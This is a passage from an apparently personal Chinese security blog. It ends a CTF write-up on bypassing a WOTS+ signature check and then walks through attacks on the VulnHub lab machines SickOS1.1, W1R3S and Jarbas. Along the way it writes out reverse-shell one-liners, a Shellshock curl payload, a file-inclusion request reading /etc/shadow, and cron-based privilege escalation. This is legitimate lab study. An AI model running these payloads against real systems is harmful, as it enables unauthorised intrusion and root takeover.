class="literal">None</span>:</span><br><span class="line">        self.w = w</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">2</span> &lt;= w &lt;= (<span class="number">1</span> &lt;&lt; digestsize)):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;规则错误:2 &lt;= w &lt;= 2^digestsize&quot;</span>)</span><br><span class="line">        <span class="comment"># 消息摘要所需的密钥数量（默认8个）</span></span><br><span class="line">        self.msg_key_count = <span class="number">8</span></span><br><span class="line">        <span class="comment"># 校验和密钥数量</span></span><br><span class="line">        self.cs_key_count = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 总密钥数量 = 消息密钥 + 校验和密钥</span></span><br><span class="line">        self.key_count = self.msg_key_count + self.cs_key_count</span><br><span class="line">        self.hashfunction = hashfunction</span><br><span class="line">        self.digestsize = digestsize</span><br><span class="line">        self.pubkey = pubkey</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">number_to_base</span>(<span class="params">num: <span class="built_in">int</span>, base: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> [<span class="number">0</span>]  <span class="comment"># 如果数字是 0，直接返回 0</span></span><br><span class="line"></span><br><span class="line">        digits = []  <span class="comment"># 存储转换后的数字位</span></span><br><span class="line">        <span class="keyword">while</span> num:</span><br><span class="line">            digits.append(<span class="built_in">int</span>(num % base))  <span class="comment"># 获取当前数字在目标进制下的个位，并添加到结果列表</span></span><br><span class="line">            num //= base  <span class="comment"># 对数字进行整除，处理下一位</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> digits[::-<span class="number">1</span>]  <span class="comment"># 返回按顺序排列的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_chain</span>(<span class="params">self, value: <span class="built_in">bytes</span>, startidx: <span class="built_in">int</span>, endidx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startidx, endidx):</span><br><span class="line">            value = self.hashfunction(value)  <span class="comment"># 每次迭代对当前哈希值进行哈希操作</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_signature_base_message</span>(<span class="params">self, msghash: <span class="built_in">bytes</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="comment"># 将消息哈希从字节转换为整数</span></span><br><span class="line">        msgnum = <span class="built_in">int</span>.from_bytes(msghash, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将消息的数字表示转换为特定进制下的比特组表示</span></span><br><span class="line">        msg_to_sign = self.number_to_base(msgnum, self.w)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 校验消息比特组的数量是否符合预期</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(msg_to_sign) &gt; self.msg_key_count:</span><br><span class="line">            err = (</span><br><span class="line">                <span class="string">&quot;The fingerprint of the message could not be split into the&quot;</span></span><br><span class="line">                + <span class="string">&quot; expected amount of bitgroups. This is most likely &quot;</span></span><br><span class="line">                + <span class="string">&quot;because the digestsize specified does not match to the &quot;</span></span><br><span class="line">                + <span class="string">&quot; real digestsize of the specified hashfunction Excepted:&quot;</span></span><br><span class="line">                + <span class="string">&quot; &#123;&#125; bitgroups\nGot: &#123;&#125; bitgroups&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> IndexError(err.<span class="built_in">format</span>(self.msg_key_count, <span class="built_in">len</span>(msg_to_sign)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> msg_to_sign</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pubkey_from_signature</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self, digest: <span class="built_in">bytes</span>, signature: <span class="type">List</span>[<span class="built_in">bytes</span>]</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="type">List</span>[<span class="built_in">bytes</span>]:</span><br><span class="line">        msg_to_verify = self.get_signature_base_message(digest)</span><br><span class="line"></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg_to_verify):</span><br><span class="line">            sig_part = signature[idx]</span><br><span class="line">            chained_val = self._chain(sig_part, val, self.w - <span class="number">1</span>)</span><br><span class="line">            result.append(chained_val)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, digest: <span class="built_in">bytes</span>, signature: <span class="type">List</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        pubkey = self.get_pubkey_from_signature(digest, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pubkey == self.pubkey <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pubkey_hex = <span class="string">&quot;5057432973dc856a7a00272d83ea1c14de52b5eb3ba8b70b373db8204eb2f902450e38dbade5e9b8c2c3f8258edc4b7e8101e94ac86e4b3cba92ddf3d5de2a2b454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3abaae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114af4f0cf8f80e22c3975ba477dc4769c3ef67ffdf2090735d81d07bc2e6235af1ee41ef332215422d31208c2bc2163d6690bd32f4926b2858ca41c12eec88c0a300571901a3f674288e4a623220fb6b70e558d9819d2f23da6d897278f4056c346d7f729f5f70805ad4e5bd25cfa502c0625ac02185e014cf36db4ebcdb3ed1a38&quot;</span></span><br><span class="line">    pubkey_list_bytes = hex_to_32byte_chunks(pubkey_hex)</span><br><span class="line">    wots = WOTSPLUS(pubkey=pubkey_list_bytes)</span><br><span class="line">    digest_hex = <span class="string">&quot;84ffb82e&quot;</span></span><br><span class="line">    signature_hex = <span class="string">&quot;25d5a0e650d683506bfe9d2eca6a3a99b547a4b99398622f6666ce10131e971b6bd36841c9074fe9b4de2900ebe3fadb3202a173be486da6cf8f3d8c699c95c3454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3abaae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114a4966398a789b56bdb09ea195925e7e8cde372305d244604c48db08f08a6e8a38951030deb25a7aaf1c07152a302ebc07d5d0893b5e9a5953f3b8500179d138b9aa90c0aaacea0c23d22a25a86c0b747c561b480175b548fcb1f4ad1153413bc74d9c049d43ffe18ceee31e5be8bdb9968103ef32fb4054a4a23c400bbfe0d89f&quot;</span></span><br><span class="line">    digest_bytes = <span class="built_in">bytes</span>.fromhex(digest_hex)</span><br><span class="line">    signature = hex_to_32byte_chunks(signature_hex)</span><br><span class="line">    valid = wots.verify(digest_bytes, signature)</span><br><span class="line">    <span class="built_in">print</span>(valid)</span><br></pre></td></tr></table></figure><p>十六进制的签名<code>signature_hex</code>经过<code>hex_to_32byte_chunks</code>被分成了八组<br><strong>消息摘要</strong>的主要用途是计算这八组数据的<strong>sha256迭代次数</strong>，如果消息摘要是<code>8xxxx</code>，那么第一次迭代次数就是7次，因为<code>w-1=15</code> <code>[8:15)</code>步长为7<br>最后会将哈希迭代之后的八组数据进行拼接，从而生成<code>pubkey</code><br>通过<code>verify认证函数</code>判断提交的摘要和签名所生成的<code>pubkey</code>是否和环境生成的<code>pubkey</code>一样</p><p>所以，思路很明确，既然哈希反向解密很难，因为这里必须得经过迭代，那么如果我迭代次数为零呢？这样我的签名通过<code>get_pubkey_from_signature</code>就会得到环境的公钥，我们直接让摘要为<code>ffffffff</code>，签名为环境提供的公钥，就可以通过验证了</p><p><img src="https://pica.zhimg.com/80/v2-a41a5389e5d7b44b7ffd5fb5f733c5b8_1440w.png" alt=""><br>还得是中科大，<strong>7分51秒</strong>拿下了一血，算上下载附件的时间，他们就做了5分钟<br>不过，这题确实不难，但他们代码审的好快啊O^O，我在那磨磨蹭蹭做了一个小时这样</p><h2 id="夺旗闯关"><a href="#夺旗闯关" class="headerlink" title="夺旗闯关*"></a>夺旗闯关*</h2><h3 id="gitea服务器"><a href="#gitea服务器" class="headerlink" title="gitea服务器*"></a>gitea服务器*</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># login.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> service</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/asn1&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/tjfoc/gmsm/sm2&quot;</span></span><br><span class="line"><span class="string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *LoginService)</span></span> Login(username, authInfo, certStr <span class="type">string</span>) (token <span class="type">string</span>, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// 读取用户证书</span></span><br><span class="line">cert, err := s.CertService.LoadCertificate(certStr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := s.CertService.ValidateCertificate(cert, RootCert); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 校验用户名</span></span><br><span class="line"><span class="keyword">if</span> cert.Subject.CommonName != username &#123;</span><br><span class="line">err = errors.New(<span class="string">&quot;username is not valid&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否挑战成功（随机字符串的签名能否用证书中的公钥验签过）</span></span><br><span class="line">ecdsaPubKey, ok := cert.PublicKey.(*ecdsa.PublicKey)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;public key in cert is not sm2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">sm2PubKey := sm2.PublicKey&#123;</span><br><span class="line">Curve: ecdsaPubKey.Curve,</span><br><span class="line">X:     ecdsaPubKey.X,</span><br><span class="line">Y:     ecdsaPubKey.Y,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 authInfo 中提取 randomStr 和 signature</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(authInfo) != <span class="number">256</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;鉴别信息格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">randomStr := authInfo[<span class="number">0</span>:<span class="number">128</span>]</span><br><span class="line">signature := authInfo[<span class="number">128</span>:]</span><br><span class="line"></span><br><span class="line">_, err = ValidateSignature(randomStr, signature, &amp;sm2PubKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s.generateToken(username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证签名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ValidateSignature</span><span class="params">(messageHex, signatureHex <span class="type">string</span>, publicKey *sm2.PublicKey)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">msg, err := hex.DecodeString(messageHex)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;挑战值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(signatureHex) != <span class="number">128</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r, ok := big.NewInt(<span class="number">0</span>).SetString(signatureHex[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">s, ok := big.NewInt(<span class="number">0</span>).SetString(signatureHex[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature, err := asn1.Marshal(<span class="keyword">struct</span>&#123; R, S *big.Int &#125;&#123;r, s&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isValid := publicKey.Verify(msg, signature)</span><br><span class="line"><span class="keyword">if</span> isValid &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, fmt.Errorf(<span class="string">&quot;签名无效&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下半场直接摆烂睡觉了，本来是准备刷一下<strong>渗透靶机</strong>的，发现<strong>解压密码</strong>在微信聊天记录里面。。。。。</p><p>断网啊，哥们，我玩牛魔……</p><p>玩！</p><p><img src="https://pic1.zhimg.com/80/v2-710631aedf0c58eeaa7b2a39dc32a476_1440w.jpeg" alt=""><br><img src="https://pica.zhimg.com/80/v2-5801c0b799379099e611b0c67ab82a82_1440w.jpeg" alt=""><br><img src="https://picx.zhimg.com/80/v2-3d1106abce12b0a535eef9715fafc69d_1440w.jpeg" alt=""><br><img src="https://picx.zhimg.com/80/v2-f54fc52f21112d13bf90e2711faa78d0_1440w.jpeg" alt=""><br><img src="https://picx.zhimg.com/80/v2-d7b80113ecfd9a518e75b475c7bf7137_1440w.jpeg" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很好，属于是来&lt;strong&gt;重庆旅&lt;/strong&gt;游来了，先爆一下战绩，初始谜题做了一个，差点爆零(bushi)&lt;/p&gt;
&lt;p&gt;去年还能做两个初始谜题，后面的夺旗闯关还能有点思路，就是不会写而已&lt;/p&gt;
&lt;p&gt;今年的夺旗闯关就真不会了，看得懂一点，但具体不知道要干嘛，&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub打靶记录</title>
    <link href="https://hvang10.github.io/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
    <published>2025-06-05T17:39:43.000Z</published>
    <updated>2025-08-05T17:48:07.498Z</updated>
    
    <content type="html"><![CDATA[<p>此文诞生于本人实习期间，属于是<strong>摸鱼成果</strong>，虽然但是也没打几个靶场，毕竟哪有这么爽的鱼可以摸</p><p>只能说<code>vulnhub</code>这边的靶场比较偏向教育性质，适合新手，可能进阶的那些我还没接触()</p><p>在某次训练营中，被主办方设计的比较贴近实际的仿真靶场给虐到了，后续应该会投向与<strong>HTB</strong>等靶场平台继续学习了……</p><h1 id="nmap命令参数介绍"><a href="#nmap命令参数介绍" class="headerlink" title="nmap命令参数介绍"></a>nmap命令参数介绍</h1><p>待补充</p><h1 id="SickOS1-1"><a href="#SickOS1-1" class="headerlink" title="SickOS1.1"></a>SickOS1.1</h1><p><code>网络适配器</code>设置成<code>NAT模式</code><br>这里靶机需要登陆<br><img src="https://picx.zhimg.com/80/v2-21c08ac76a33163198a021514062757c_1440w.png" alt=""></p><h2 id="主机发现和端口扫描"><a href="#主机发现和端口扫描" class="headerlink" title="主机发现和端口扫描"></a>主机发现和端口扫描</h2><p><code>ip a</code>获取<code>kali本机</code>的<code>ip</code>，然后扫描该网段的主机存活信息<br><code>nmap -sn 192.168.32.0/24</code><br>靶机上线前后各扫一次就可以找到靶机<code>ip</code>了<br>最小速率<code>10000</code>扫描，<code>-p-</code>扫描<strong>全部端口</strong><br><code>nmap --min-rate 10000 -p- 192.168.32.129</code><br><img src="https://pic1.zhimg.com/80/v2-82d47efe9e72e894d16067edb8ac4171_1440w.png" alt=""><br>发现22端口的<code>ssh服务</code>开放，3128端口的<code>squid-http服务</code>开放，8080端口的<code>http服务</code>关闭<br><code>tcp</code>再扫一下这三个端口，<code>-sT</code>用TCP扫描，<code>-sV</code>查看服务版本，<code>-O</code>查看操作系统版本，<code>-p</code>后面添加端口号<br><img src="https://pica.zhimg.com/80/v2-7f9f07fd0dc6498906a9cff77ca3508a_1440w.png" alt=""></p><p><code>UDP</code>再扫一次，确保不会漏掉攻击面<br><code>nmap -sU -p22,3128,8080 192.168.32.129</code><br><img src="https://picx.zhimg.com/80/v2-8afcd761d67cfbf54242e06960b1a311_1440w.png" alt=""><br>还是没有关键信息</p><p>再用<code>nmap</code>自带的漏洞扫描脚本扫一下<br><code>nmap --script=vuln -p22,3128,8080 192.168.32.129</code><br>一样没有关键信息</p><p>目前得到的信息是，无法访问的8080的端口<code>web服务</code>，3128端口的<code>http代理服务</code>，22端口的<code>ssh服务</code>这边暂时不知道用户名密码也无法入手</p><p>也不知道<code>squid</code>是个什么玩意，访问对应端口，然后搜<code>squid/3.1.19</code>，只知道是一个比较老的开源代理服务器，还涉及到几个<code>CVE</code></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirb http://192.168.32.129 -p http://192.168.32.129:3128</code><br><img src="https://picx.zhimg.com/80/v2-f4223785ce4f09a6f4ff5def3ad49535_1440w.png" alt=""></p><h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>同样需要设置代理才能访问靶机(可以直接搜<code>proxy</code>)<br><img src="https://picx.zhimg.com/80/v2-01c5ab3134851be70aeac2b4f163fba9_1440w.png" alt=""><br><code>robots.txt</code>告诉我们可以访问一下<code>/wolfcms</code><br>这是一个<code>cms内容管理系统</code>，并且发现文章是<strong>管理员</strong>上传的，找一下<code>admin</code>登陆路径</p><p><code>/wolfcms/?/admin/login</code>，弱口令<code>admin/admin</code>进去了<br><img src="https://picx.zhimg.com/80/v2-e2a9ffcf2bd7b28a66f28b3458da0627_1440w.png" alt=""></p><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>发现很多<code>php</code>代码文件并且可以直接修改，直接塞一句<code>反弹shell</code>进去<code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#39;&quot;); ?&gt;</code><br>然后保存访问一下，靶机就可以连上我们主机了<br><code>kali</code>开监听<code>2333端口</code></p><p><img src="https://pic1.zhimg.com/80/v2-76a4d4e13c1081d3f78a86f48f9e161f_1440w.png" alt=""><br>这里拿到的是<code>mysql</code>的账密，看一下<code>/etc/passwd</code><br>发现账户有<code>root sickos www-data</code>，并且<code>root sickos</code>都有<code>/bin/bash</code>的环境，<code>sickos</code>可能是一个高权限用户，尝试了<code>ssh</code>登陆</p><p>发现<code>sickos/john@123</code>可以登陆，知道密码我们可以直接提权<code>sudo su</code></p><h2 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h2><p>思路二：</p><p>既然涉及到网页服务，也可以拿<code>nikto</code>扫一下<br><code>nikto</code>是一个开源的网页服务器扫描器，坏处就是它不经常更新</p><p>这里还是要走一下代理<br><code>nikto -h 192.168.32.129 -useproxy http://192.168.32.129:3128</code><br>发现在<code>/cgi-bin/status</code>目录下存在<code>ShellShock</code>漏洞<br><img src="https://picx.zhimg.com/80/v2-e2f1b88e8ac8388804e26b0cf310850f_1440w.png" alt=""><br><code>Shellshock</code>，又称<code>Bashdoor</code>，是在<code>Unix</code>中广泛使用的<code>Bash shell</code>中的一个安全漏洞，首次于2014年9月24日公开。许多互联网守护进程，如网页服务器，使用<code>bash</code>来处理某些命令，从而允许攻击者在易受攻击的<code>Bash</code>版本上执行任意代码。这可使攻击者在未授权的情况下访问计算机系统</p><h2 id="shellshock漏洞利用"><a href="#shellshock漏洞利用" class="headerlink" title="shellshock漏洞利用"></a>shellshock漏洞利用</h2><p>这里可以通过构造恶意的<code>Referer头</code>来执行任意命令</p><p><code>curl -v --proxy http://192.168.32.129:3128 http://192.168.32.129/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/id;exit&quot;</code><br>发现成功执行了</p><p>可以<code>反弹shell</code>看看有没有可利用的信息</p><p>生成<code>bash反弹shell</code>命令<br><code>msfvenom -p cmd/unix/reverse_bash lhost=192.168.32.128 lport=2333 -f raw</code></p><p><code>curl -v --proxy http://192.168.32.129:3128 http://192.168.32.129/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;113-;exec 113&lt;&gt;/dev/tcp/192.168.32.128/2333;/bin/sh &lt;&amp;113 &gt;&amp;113 2&gt;&amp;113&quot;</code></p><p><code>kali</code>开监听<code>nc lvnp 2333</code></p><p>发现交互很难看，通过<code>包管理器</code>看看有没有<code>Python</code>之类方便的<code>交互shell</code><br><code>dpkg -l</code></p><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p>查看网页的根目录<code>cd /var/www</code><br>查看权限<code>ls -al</code><br>发现<code>connect.py</code>居然给到了<code>777</code>，即<strong>所有用户</strong>都<strong>可读可写可执行</strong><br>这里可以根据内容猜测它存在<strong>定时任务</strong></p><h2 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p><code>cd /etc</code><br><code>ls -al | grep &quot;cron&quot;</code><br><code>cd cron.d</code><br><code>cat automate</code><br>发现它是以<code>root权限</code>每分钟执行<code>connect.py</code>这个文件，这样就可以通过写<code>Python的反弹shell命令</code>到<code>connect.py</code>这个文件，就可以成功<code>root</code>了</p><p><code>msfvenom -p cmd/unix/reverse_python lhost=192.168.32.128 lport=2333 -f raw</code></p><p>然后<code>kali</code>开监听，等一分钟左右即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>账密默认配置</strong>可能是个突破口，但现在的环境基本无法利用；<strong>定时任务</strong>也是一个很有用的<strong>提权</strong>思路</p><h1 id="W1R3S1-01"><a href="#W1R3S1-01" class="headerlink" title="W1R3S1.01"></a>W1R3S1.01</h1><h2 id="主机发现和端口扫描-1"><a href="#主机发现和端口扫描-1" class="headerlink" title="主机发现和端口扫描"></a>主机发现和端口扫描</h2><p>是一个<code>ubuntu16</code>的靶机，同样需要密码登陆</p><p><code>nmap -sn 192.168.32.0/24</code><br>发现主机<code>192.168.32.130</code><br><code>nmap --min-rate 10000 -p- 192.168.32.130</code><br>发现21端口<code>ftp文件传输服务</code>，22端口<code>ssh服务</code>，80端口<code>http服务</code>，3306端口<code>mysql服务</code><br><img src="https://picx.zhimg.com/80/v2-51ee067e4460f2642cb867c77575205c_1440w.png" alt=""><br>发现了<code>wordpress</code>登陆网页</p><p><code>ftp服务</code>没有什么可以利用的信息，可以通过<code>get</code>下载文件</p><p><code>wordpress</code>登陆页面的操作都是在跳转<code>localhost</code>，不能进行爆密码操作。。。</p><h2 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>换<code>dirsearch</code>扫一下，<code>kali</code>的<code>dirb</code>没有高亮，不习惯，<code>python ./dirsearch.py -u 192.168.32.130</code></p><p><code>http://192.168.32.130/administrator/installation/</code>得知这是一个<code>Cuppa CMS</code>，这里的操作页面是没有什么用的，找一下<code>CMS</code>的漏洞</p><h2 id="web渗透-1"><a href="#web渗透-1" class="headerlink" title="web渗透"></a>web渗透</h2><p><code>searchsploit cuppa</code>，告诉我们<code>/alertConfigField.php</code>存在<strong>本地/远程文件包含</strong><br>获取说明<code>searchsploit cuppa -m 25971.txt</code></p><p>这里需要修改一下路径<code>http://192.168.32.130/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></p><p>但页面并没有回显，换成<code>POST请求</code>或者<code>curl</code><br><code>curl -X POST -d &quot;urlConfig=../../../../../../../../../etc/passwd&quot; http://192.168.32.130/administrator/alerts/alertConfigField.php</code><br>读一下影子文件<code>/etc/shadow</code>，因为<code>passwd</code>里面的密码只能显示<code>x</code><br>拿到<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br></pre></td></tr></table></figure><br>这里就拿到了三个用户的密码哈希</p><h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>拿<strong>john</strong>爆一下<br><img src="https://picx.zhimg.com/80/v2-6bfd16e3f6ad3646ca21319b27dbf523_1440w.png" alt=""><br>有密码就直接提权了</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>本靶机找到<code>cuppa</code>的漏洞即可，要注意这些不怎么明显的信息</p><h1 id="jarbas"><a href="#jarbas" class="headerlink" title="jarbas"></a>jarbas</h1><h2 id="主机发现与端口扫描"><a href="#主机发现与端口扫描" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p>这是个<code>centos7</code>的靶机<br><code>nmap -sn 192.168.32.0/24</code><br>发现主机<code>192.168.32.131</code><br><code>nmap --min-rate 10000 -p- 102.168.32.131</code><br>发现开放了<code>22 80 3306</code><br><code>TCP UDP</code>扫，<code>nmap</code>自带脚本扫，没有得到有用信息</p><h2 id="目录扫描-2"><a href="#目录扫描-2" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirb http://192.168.32.131</code>，诶，没扫到东西出来，指定后缀<br><code>dirb http://192.168.32.131 -X .php,.html</code>，扫出一个<code>access.html</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago:5978a63b4654c73c60fa24f836386d87</span><br><span class="line">trindade:f463f63616cb3f1e81ce46b39f882fd5</span><br><span class="line">eder:9b38e2b1e8b12f426b0d208a7ab6cb98</span><br></pre></td></tr></table></figure><br><a href="https://hashes.com/en/decrypt/hash">多行哈希解密</a><br><code>italia99 vipsu marianna</code></p><h2 id="web渗透-2"><a href="#web渗透-2" class="headerlink" title="web渗透"></a>web渗透</h2><p>重启了靶机才扫出<code>8080端口</code>，我就说登陆界面怎么不见了。。。<br>账密对不上，得试试排列组合<code>eder vipsu</code><br>登进去后，随便点击创建项目，居然发现了这个<br><img src="https://picx.zhimg.com/80/v2-ac6ce63ef84ebf1e3083feeca7f59d12_1440w.png" alt=""><br><code>bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1</code>写入保存然后点击立即构建，本地开监听<br><code>whoami</code>得知当前用户为<code>jenkins</code>，读<code>/etc/passwd</code>只有<code>root ede</code>r有<code>/bin/bash</code>环境，但读取不到<code>/etc/shadow</code><br>接下来继续找找有没有<strong>定时任务</strong>可以利用</p><h2 id="定时任务提权-1"><a href="#定时任务提权-1" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p>查看系统定时任务<code>cat /etc/crontab</code><br><img src="https://picx.zhimg.com/80/v2-e75274d832efe214ad63a2888cfe88f9_1440w.png" alt=""><br>发现<strong>root权限</strong>运行的定时任务，该<code>sh脚本</code>是用来删日志文件的<br>看一下权限是<strong>777</strong>，那我们直接追加写入<code>反弹shell</code>语句就好了<br><code>echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.32.128/233 0&gt;&amp;1&#39; &gt;&gt; 